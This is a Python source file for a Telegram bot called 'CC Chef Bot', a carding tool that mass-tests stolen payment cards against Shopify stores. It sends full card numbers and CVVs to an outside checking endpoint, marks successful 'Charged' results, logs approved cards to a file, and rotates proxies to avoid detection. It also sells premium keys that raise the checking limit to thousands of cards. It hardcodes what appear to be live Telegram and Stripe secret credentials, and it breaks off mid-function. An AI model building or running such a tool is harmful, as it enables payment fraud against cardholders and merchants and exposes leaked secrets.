from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
import requests, random, datetime, json, os, re, asyncio, time
import string, aiohttp, stripe, aiofiles
from urllib.parse import urlparse
import html

# ─── CONFIG ────────────────────────────────────────────────────────
OWNER_ID = 8353717748
API_ID = 37056675
API_HASH = "7517ae9cd54e88cb63f39a061d8bb77f"
BOT_TOKEN = "8644266957:AAEYmAA2uiR9732a_8xnyBJUEr_NXUyyCPs"
STRIPE_KEYS = ["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"]

# FILES
ADMIN_FILE = "admins.json"
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}

# CLIENT - ONLY ONCE
client = TelegramClient('cc_bot', API_ID, API_HASH)
stripe.api_key = STRIPE_KEYS[0]

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}
    
# ==================== ADMIN FUNCTIONS ====================
async def load_admins():
    try:
        data = await load_json(ADMIN_FILE)
        admins = data.get("admins", [])
        if OWNER_ID not in admins:
            admins.append(OWNER_ID)
        return admins
    except:
        return [OWNER_ID]

async def save_admins(admins_list):
    data = {"admins": admins_list}
    await save_json(ADMIN_FILE, data)

async def is_owner(user_id):
    return user_id == OWNER_ID

async def is_admin(user_id):
    admins = await load_admins()
    return user_id in admins
# --- Utility Functions ---
async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"
    except Exception: return "-", "-", "-", "-", "-", "🏳️"

async def load_admins():
    try:
        data = await load_json(ADMIN_FILE)
        admins = data.get("admins", [])
        # Always ensure owner is in admin list
        if OWNER_ID not in admins:
            admins.append(OWNER_ID)
        return admins
    except:
        return [OWNER_ID]

async def save_admins(admins_list):
    data = {"admins": admins_list}
    await save_json(ADMIN_FILE, data)

async def is_owner(user_id):
    return user_id == OWNER_ID

async def is_admin(user_id):
    admins = await load_admins()
    return user_id in admins

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

async def get_user_proxy(user_id):
    """Get a random proxy for a specific user"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    if not user_proxies:
        return None
    
    # Return a random proxy - user_proxies is a list, so we need to check if it's not empty
    if len(user_proxies) == 0:
        return None
    
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    # Find and remove the dead proxy
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    """Get all proxies for a specific user"""
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

async def check_card_random_site(card, sites, user_id=None):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    
    # Get user proxy if available
    proxy_data = await get_user_proxy(user_id) if user_id else None
    
    try:
        # Ensure site has proper format
        if not selected_site.startswith('http'):
            selected_site = f'https://{selected_site}'
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Build API URL with new endpoint
        url = f'http://dev-kamal.pw/shopi.php?cc={card}&url={selected_site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                
                try:
                    response_json = await res.json()
                except:
                    # If JSON parsing fails, try to get text
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
                
                # Parse the new API response format
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-':
                    price = f"${price}"
                
                gateway = response_json.get('Gate', 'Shopify')
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {
                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                        "Price": "-",
                        "Gateway": "-",
                        "Status": "Proxy Dead"
                    }, site_index
                
                # Check for charged status
                if "Order completed" in api_response or "💎" in api_response:
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": "Charged"
                    }, site_index
                else:
                    # Return the response as is
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": api_response
                    }, site_index
                    
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site, user_id=None):
    # Get user proxy if available
    proxy_data = await get_user_proxy(user_id) if user_id else None
    
    try:
        # Ensure site has proper format
        if not site.startswith('http'):
            site = f'https://{site}'
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Build API URL with new endpoint
        url = f'http://dev-kamal.pw/shopi.php?cc={card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                
                try:
                    response_json = await res.json()
                except:
                    # If JSON parsing fails, try to get text
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}
                
                # Parse the new API response format
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-':
                    price = f"${price}"
                
                gateway = response_json.get('Gate', 'Shopify')
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {
                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                        "Price": "-",
                        "Gateway": "-",
                        "Status": "Proxy Dead"
                    }
                
                # Check for charged status
                if "Order completed" in api_response or "💎" in api_response:
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": "Charged"
                    }
                else:
                    # Return the response as is
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": api_response
                    }
                    
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:  # In a group
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

async def get_cc_limit(access_type, user_id=None):
    """
    Returns max CCs user can check at once.
    Priority: Admin > Premium > Group Free > Others
    """
    if user_id and await is_admin(user_id):
        return 5000          # Admins (incl. owner) get god mode

    if access_type in ["premium_private", "premium_group"]:
        return 4000          # Premium users

    if access_type == "group_free":
        return 500           # Normal group members

    return 0                 # No access

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

# ─── UPDATED & IMPROVED PROXY PARSER ─────────────────────────────────
def parse_proxy(proxy: str):
    """Universal proxy parser - supports all formats"""
    proxy = proxy.strip()
    if not proxy:
        return None

    # Clean junk
    proxy = re.sub(r'^[\[\(\{<\s]+|[\]\)\}>\s]+$', '', proxy)

    scheme = "http"
    if "://" in proxy:
        scheme_part, proxy = proxy.split("://", 1)
        scheme = scheme_part.lower()

    username = password = None
    host = port = None

    # Handle @ format: user:pass@host:port
    if "@" in proxy:
        auth, hostport = proxy.split("@", 1)
        if ":" in auth:
            username, password = auth.split(":", 1)
        if ":" in hostport:
            host, port = hostport.split(":", 1)
        else:
            host = hostport
    else:
        parts = proxy.split(":")
        if len(parts) == 2:
            host, port = parts
        elif len(parts) == 3:
            if parts[1].isdigit():
                host, port, username = parts
            else:
                username, password, host = parts
        elif len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            username = parts[2]
            password = ":".join(parts[3:])   # Support : in password

    # Fallback for socks4://ip:port:user:pass etc.
    if (not host or not port) and re.match(r'.+:\d+:.+:.+', proxy):
        parts = proxy.split(":")
        if len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            username = parts[2]
            password = ":".join(parts[3:])

    if not host or not port:
        return None

    try:
        port = int(port)
        if not (1 <= port <= 65535):
            return None
    except:
        return None

    # Normalize scheme
    if scheme not in ["http", "https", "socks4", "socks5"]:
        scheme = "http"

    # Build full proxy_url
    if username and password:
        proxy_url = f"{scheme}://{username}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"

    return {
        "ip": host,
        "port": str(port),
        "username": username,
        "password": password,
        "proxy_url": proxy_url,
        "type": scheme
    }

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    user_id = event.sender_id
    if await is_banned_user(user_id):
        return await event.reply(banned_user_message())

    can_access, access_type = await can_use(user_id, event.chat)
    limit = await get_cc_limit(access_type, user_id)

    premium_status = "🆓 **Free User**"
    if await is_premium_user(user_id):
        premium_status = "💎 **Premium Active**"

    role = "👑 Bot Owner" if await is_owner(user_id) else "⭐ Bot Admin" if await is_admin(user_id) else "Chef"

    text = f"""🍳 **CC Chef Bot – Welcome {role}** 🔥
{premium_status}
**Your Current Limit:** {limit:,} CCs per check

━━━━━━ **Main Gates** ━━━━━━
**Shopify Auto-Charge**
• `/sh` → Single check
• `/msh` → Mass check
• `/mtxt` → From .txt file
• `/ran` → Random sites

**Tools**
• `/add` → Add sites
• `/addpxy` → Add proxy
• `/info` → Your stats
• `/redeem <key>` → Activate key

Start cooking 🔥
Support: @Dreadsync_2
"""
    await event.reply(text)

# ================= PROXY TEST FIX ================= #

async def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                'http://api.ipify.org?format=json',
                proxy=proxy_url
            ) as res:

                if res.status == 200:
                    try:
                        data = await res.json()
                        return True, data.get('ip', 'Unknown')
                    except Exception:
                        return False, "Invalid JSON response"

                return False, f"HTTP {res.status}"

    except asyncio.TimeoutError:
        return False, "Timeout"

    except aiohttp.ClientProxyConnectionError:
        return False, "Proxy connection failed"

    except Exception as e:
        return False, str(e)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset', 
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small','SITE DEAD', 'site dead',
        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors', 'Site errors: Failed to tokenize card', 'Failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        # Ensure site has proper format
        if not site.startswith('http'):
            site = f'https://{site}'
        
        # Get user proxy if available
        proxy_data = await get_user_proxy(user_id) if user_id else None
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Use the new endpoint
        url = f'http://dev-kamal.pw/shopi.php?cc={test_card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}
                
                try:
                    response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"status": "dead", "response": f"Invalid JSON: {response_text[:100]}", "site": site, "price": "-"}
                
                # Parse the new API response format
                response_msg = response_json.get("Response", "")
                price = response_json.get("Price", "-")
                if price != '-':
                    price = f"${price}"
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in response_msg.lower() or 'connection' in response_msg.lower() or 'timeout' in response_msg.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {"status": "proxy_dead", "response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "site": site, "price": "-"}
                
                if is_site_dead(response_msg): 
                    return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else: 
                    return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e: 
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

client = TelegramClient('cc_bot', API_ID, API_HASH)

def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Dreadsync_2"

def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/deebuchecked")]]
    return message, buttons

# --- Bot Command Handlers ---
# ====================== ADD ADMIN ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addadmin'))
async def add_admin(event):
    if not await is_owner(event.sender_id):
        return await event.reply("🚫 **Only the Bot Owner can add admins!**")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:**\n`/addadmin <user_id>`\n\nExample: `/addadmin 123456789`")

        new_admin_id = int(parts[1])

        if new_admin_id == OWNER_ID:
            return await event.reply("✅ Owner is already admin by default.")

        admins = await load_admins()

        if new_admin_id in admins:
            return await event.reply(f"⚠️ User `{new_admin_id}` is already an admin.")

        admins.append(new_admin_id)
        await save_admins(admins)

        await event.reply(f"✅ **New Admin Added!**\nUser ID: `{new_admin_id}`\n\nNow has full admin rights.")

        # Notify the new admin
        try:
            await client.send_message(new_admin_id, f"🎉 **Congratulations!**\n\nYou have been promoted to **Bot Admin** by the owner.\nYou can now use admin commands.")
        except:
            pass

    except ValueError:
        await event.reply("❌ Invalid User ID! Must be a number.")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")


# ====================== REMOVE ADMIN ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmadmin'))
async def remove_admin(event):
    if not await is_owner(event.sender_id):
        return await event.reply("🚫 **Only the Bot Owner can remove admins!**")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:**\n`/rmadmin <user_id>`\n\nExample: `/rmadmin 123456789`")

        target_id = int(parts[1])

        if target_id == OWNER_ID:
            return await event.reply("❌ **You cannot remove the Owner!**")

        admins = await load_admins()

        if target_id not in admins:
            return await event.reply(f"⚠️ User `{target_id}` is not an admin.")

        admins.remove(target_id)
        await save_admins(admins)

        await event.reply(f"✅ **Admin Removed!**\nUser ID: `{target_id}`")

        # Notify the removed admin
        try:
            await client.send_message(target_id, "⚠️ You have been **demoted** from Bot Admin.")
        except:
            pass

    except ValueError:
        await event.reply("❌ Invalid User ID! Must be a number.")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if not await is_admin(event.sender_id): return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪m 𝙖𝙘𝙘𝙚𝙨𝙨!")
        try: await client.send_message(user_id, f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
        except: pass
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙤𝙧 𝙙𝙖𝙮𝙨!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if not await is_admin(event.sender_id): return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem <key>\n𝙀𝙭𝙖𝙢𝙥𝙡𝙚: /redeem ABC123XYZ789")

        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)

        if key not in keys_data:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮! 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙠𝙚𝙮 𝙤𝙧 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙨𝙪𝙥𝙥𝙤𝙧𝙩.")

        if keys_data[key].get('used', False):
            used_by = keys_data[key].get('used_by', 'Unknown')
            used_at = keys_data[key].get('used_at', 'Unknown')
            return await event.reply(
                f"❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!\n\n"
                f"Used by: `{used_by}`\n"
                f"Used at: {used_at}"
            )

        # Check if user already has premium → merge time
        already_premium = await is_premium_user(event.sender_id)
        current_expiry = None
        if already_premium:
            premium_users = await load_json(PREMIUM_FILE)
            user_data = premium_users.get(str(event.sender_id))
            if user_data:
                current_expiry = datetime.datetime.fromisoformat(user_data['expiry'])

        days_to_add = keys_data[key]['days']
        new_expiry = datetime.datetime.now() + datetime.timedelta(days=days_to_add)

        # If already premium → add days to existing expiry
        if current_expiry and current_expiry > datetime.datetime.now():
            new_expiry = current_expiry + datetime.timedelta(days=days_to_add)

        # Update premium status
        premium_users = await load_json(PREMIUM_FILE)
        premium_users[str(event.sender_id)] = {
            'expiry': new_expiry.isoformat(),
            'added_by': 'redeem_key',
            'days': days_to_add if not already_premium else days_to_add + (premium_users[str(event.sender_id)].get('days', 0)),
            'redeemed_key': key,
            'redeemed_at': datetime.datetime.now().isoformat()
        }
        await save_json(PREMIUM_FILE, premium_users)

        # Mark key as used
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)

        # Calculate remaining days
        remaining_days = (new_expiry - datetime.datetime.now()).days
        expiry_date_str = new_expiry.strftime("%Y-%m-%d %H:%M:%S")

        # Final success message
        msg = f"""🎉 **𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔!**

🔑 Key: `{key}`
⏳ Days added: **{days_to_add}**
💎 New Premium Expiry: **{expiry_date_str}**
📅 Remaining days: **{remaining_days}**

You now have premium access in private chat!
CC limit → **4000 cards** per check
Enjoy cooking 🔥"""
        
        if already_premium:
            msg += "\n\n(Your previous premium time was extended!)"

        await event.reply(msg)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙙𝙚𝙚𝙢𝙞𝙣𝙜 𝙠𝙚𝙮: {str(e)}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]add(\s+|$)'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    raw_text = event.raw_text.strip().lower()

    # Extra safety to prevent conflict with /addadmin, /addpxy etc.
    if any(x in raw_text for x in ['addadmin', 'rmadmin', 'addpxy', 'rmpxy', 'proxy']):
